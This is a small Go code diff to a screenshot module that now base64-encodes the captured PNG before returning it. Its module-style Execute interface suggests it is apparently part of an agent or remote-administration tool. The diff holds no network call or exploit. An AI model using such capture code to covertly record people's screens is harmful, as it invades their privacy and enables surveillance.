@@ -2,10 +2,11 @@ package modules
 
 import (
 	"bytes"
-    "fmt"
-    "image/png"
+	"encoding/base64"
+	"fmt"
+	"image/png"
 
-    "github.com/kbinani/screenshot"
+	"github.com/kbinani/screenshot"
 )
 
 type ScreenshotModule struct{}
@@ -35,8 +36,8 @@ func (m *ScreenshotModule) Execute(filename string, data []byte) (string, error)
         return "", fmt.Errorf("failed to encode png: %w", err)
     }
 
-    // Convert the buffer to a string
-    imgStr := buf.String()
+    // Encode the buffer to a base64 string
+    imgBase64Str := base64.StdEncoding.EncodeToString(buf.Bytes())
 
-    return imgStr, nil
+    return imgBase64Str, nil
 }
